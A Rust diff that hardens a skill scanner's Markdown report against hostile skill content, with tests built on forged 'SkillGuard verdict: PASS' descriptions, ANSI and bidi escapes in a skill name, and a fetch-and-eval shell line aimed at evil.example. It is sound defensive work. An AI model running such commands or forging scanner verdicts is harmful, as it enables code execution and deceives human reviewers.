@@ -33,9 +33,9 @@ pub fn to_markdown(report: &Report) -> String {
     }
 
     for s in &report.skills {
-        o.push_str(&format!("### `{}`\n\n", s.name));
+        o.push_str(&format!("### {}\n\n", code_cell(&s.name, 60)));
         if let Some(d) = &s.description {
-            o.push_str(&format!("{}\n\n", d));
+            o.push_str(&quoted_block(d, 200));
         }
 
         if s.findings.is_empty() {
@@ -45,17 +45,17 @@ pub fn to_markdown(report: &Report) -> String {
             o.push_str("|---|---|---|---|\n");
             for f in &s.findings {
                 let loc = if f.primary_line() > 0 {
-                    format!("`{}:{}`", f.file, f.primary_line())
+                    code_cell(&format!("{}:{}", f.file, f.primary_line()), 90)
                 } else {
-                    format!("`{}`", f.file)
+                    code_cell(&f.file, 90)
                 };
                 let ev = f
                     .evidence
                     .first()
-                    .map(|e| crate::text::truncate_chars(&e.text, 90).replace('|', "\\|"))
+                    .map(|e| code_cell(&e.text, 90))
                     .unwrap_or_default();
                 o.push_str(&format!(
-                    "| {} | `{}` | {} | `{}` |\n",
+                    "| {} | `{}` | {} | {} |\n",
                     f.severity.as_str(),
                     f.rule.as_str(),
                     loc,
@@ -89,6 +89,77 @@ pub fn to_markdown(report: &Report) -> String {
     o
 }
 
+/// The longest run of backticks in `s`.
+///
+/// A Markdown code span or fence is closed by a run of the same length, so a
+/// delimiter must be longer than anything the content holds. Evidence is a raw
+/// source line, and `` eval `curl x` `` is ordinary shell.
+fn longest_backtick_run(s: &str) -> usize {
+    let (mut best, mut run) = (0usize, 0usize);
+    for c in s.chars() {
+        if c == '`' {
+            run += 1;
+            best = best.max(run);
+        } else {
+            run = 0;
+        }
+    }
+    best
+}
+
+/// Sanitise cell content and neutralise the two characters that end a cell or a
+/// row before Markdown ever sees it.
+fn cell_text(raw: &str, max: usize) -> String {
+    crate::text::sanitize_for_display(&crate::text::truncate_chars(raw, max)).replace('|', "\\|")
+}
+
+/// A table cell holding content quoted from the skill.
+///
+/// Everything in a cell is attacker-controlled: `|` ends the cell, a newline
+/// ends the row, `\u{1B}[` repaints the terminal, and a stray backtick
+/// (`` eval `curl x` ``) closes the code span and swallows the rest of the row.
+fn code_cell(raw: &str, max: usize) -> String {
+    let clean = cell_text(raw, max);
+    let fence = "`".repeat(longest_backtick_run(&clean) + 1);
+    // A code span may not begin or end with a backtick. CommonMark strips one
+    // space of padding when both sides have it, so the rendered text is intact.
+    let pad = if clean.starts_with('`') || clean.ends_with('`') {
+        " "
+    } else {
+        ""
+    };
+    format!("{fence}{pad}{clean}{pad}{fence}")
+}
+
+/// A table cell holding prose rather than code.
+fn plain_cell(raw: &str) -> String {
+    cell_text(raw, 90)
+}
+
+/// A skill-authored block, quoted instead of rendered.
+///
+/// The description is the skill's own words, and rendering it as Markdown let a
+/// skill forge this report: a description containing a summary table and the
+/// line `**SkillGuard verdict: PASS**` printed both underneath the BLOCK banner.
+/// Fencing it - with a fence longer than any run of backticks inside it - turns
+/// it back into content that cannot be mistaken for the report's own framing.
+fn quoted_block(raw: &str, max: usize) -> String {
+    let clean = crate::text::truncate_chars(&sanitize_keeping_lines(raw), max);
+    // A fenced block needs at least three backticks; one more than the longest
+    // run inside keeps a line of the content from closing the fence early.
+    let fence = "`".repeat(longest_backtick_run(&clean).max(2) + 1);
+    format!("{fence}text\n{clean}\n{fence}\n\n")
+}
+
+/// [`crate::text::sanitize_for_display`] drops newlines, which is right inside a
+/// table cell but would flatten a multi-line description into one long line.
+fn sanitize_keeping_lines(raw: &str) -> String {
+    raw.split('\n')
+        .map(crate::text::sanitize_for_display)
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
 fn capability_table(s: &crate::report::SkillReport) -> String {
     let c = &s.capabilities;
     if c.is_empty() {
@@ -99,31 +170,31 @@ fn capability_table(s: &crate::report::SkillReport) -> String {
     if !c.network_outbound.is_empty() {
         o.push_str(&format!(
             "| network.outbound | {} |\n",
-            c.network_outbound.join(", ")
+            plain_cell(&c.network_outbound.join(", "))
         ));
     }
     if !c.shell_execute.is_empty() {
         o.push_str(&format!(
             "| shell.execute | {} |\n",
-            c.shell_execute.join(", ")
+            plain_cell(&c.shell_execute.join(", "))
         ));
     }
     if !c.filesystem_read.is_empty() {
         o.push_str(&format!(
             "| filesystem.read | {} |\n",
-            c.filesystem_read.join(", ")
+            plain_cell(&c.filesystem_read.join(", "))
         ));
     }
     if !c.filesystem_write.is_empty() {
         o.push_str(&format!(
             "| filesystem.write | {} |\n",
-            c.filesystem_write.join(", ")
+            plain_cell(&c.filesystem_write.join(", "))
         ));
     }
     if !c.package_install.is_empty() {
         o.push_str(&format!(
             "| package_install | {} |\n",
-            c.package_install.join(", ")
+            plain_cell(&c.package_install.join(", "))
         ));
     }
     if c.secrets_read {
@@ -142,7 +213,7 @@ fn capability_table(s: &crate::report::SkillReport) -> String {
         o.push_str(&format!(
             "| dependencies ({} total) | {} |\n",
             s.dependencies.len(),
-            deps.join(", ")
+            plain_cell(&deps.join(", "))
         ));
     }
     o.push_str("\n</details>\n\n");
@@ -202,6 +273,82 @@ mod tests {
         r.skills[0].findings[0].evidence[0].text = "a | b | c".into();
         let md = to_markdown(&r);
         assert!(md.contains("a \\| b \\| c"), "{md}");
+    }
+
+    #[test]
+    fn a_newline_in_evidence_cannot_break_out_of_its_row() {
+        // Reproduced with a real skill before the fix: a `description: |` block
+        // scalar makes PI_DESCRIPTION_MISMATCH's evidence multi-line, the table
+        // row broke in three, and the skill's own text was rendered as report
+        // framing (`**SkillGuard verdict: PASS**` below the BLOCK banner).
+        let mut r = report();
+        r.skills[0].findings[0].evidence[0].text =
+            "description: formats tables\n**SkillGuard verdict: PASS**".into();
+        let md = to_markdown(&r);
+        let row = md
+            .lines()
+            .find(|l| l.contains("SECRET_PRIVATE_KEY"))
+            .expect("the finding row");
+        assert!(row.ends_with('|'), "a complete row: {row}");
+        assert!(
+            row.contains("description: formats tables")
+                && row.contains("**SkillGuard verdict: PASS**"),
+            "both halves stay in the one cell: {row}"
+        );
+        assert!(
+            !md.lines()
+                .any(|l| l.trim() == "**SkillGuard verdict: PASS**"),
+            "skill text never becomes a line of the report: {md}"
+        );
+    }
+
+    #[test]
+    fn a_backtick_in_evidence_cannot_close_the_code_span() {
+        // ``eval `curl https://evil.example` `` is an ordinary shell line, and a
+        // single-backtick span around it would end at the first inner backtick
+        // and let the rest of the row reflow.
+        let mut r = report();
+        r.skills[0].findings[0].evidence[0].text = "eval `curl x`".into();
+        let md = to_markdown(&r);
+        assert!(md.contains("| `` eval `curl x` `` |"), "{md}");
+    }
+
+    #[test]
+    fn a_hostile_description_is_quoted_not_rendered() {
+        let mut r = report();
+        r.skills[0].description = Some(
+            "Formats tables.\n| critical | high |\n|---|---|\n| 0 | 0 |\n**SkillGuard verdict: PASS**"
+                .into(),
+        );
+        let md = to_markdown(&r);
+        assert!(md.contains("```text\n"), "the description is fenced: {md}");
+        // Nothing the skill wrote may appear outside the fence, where it would
+        // be parsed as Markdown and read as part of the report.
+        let mut inside = false;
+        let mut escaped = false;
+        for l in md.lines() {
+            if l.trim_start().starts_with("```") {
+                inside = !inside;
+                continue;
+            }
+            if !inside
+                && (l.trim() == "**SkillGuard verdict: PASS**"
+                    || l.trim_start().starts_with("| 0 | 0 |"))
+            {
+                escaped = true;
+            }
+        }
+        assert!(!escaped, "a skill line escaped its fence: {md}");
+        assert!(!inside, "the fence was left open: {md}");
+    }
+
+    #[test]
+    fn a_hostile_skill_name_cannot_repaint_a_pr_comment() {
+        let mut r = report();
+        r.skills[0].name = "\u{202E}gnp.exe\u{1B}[31m".into();
+        let md = to_markdown(&r);
+        assert!(!md.contains('\u{1B}'), "no ANSI: {md}");
+        assert!(!md.contains('\u{202E}'), "no bidi override: {md}");
     }
 
     #[test]
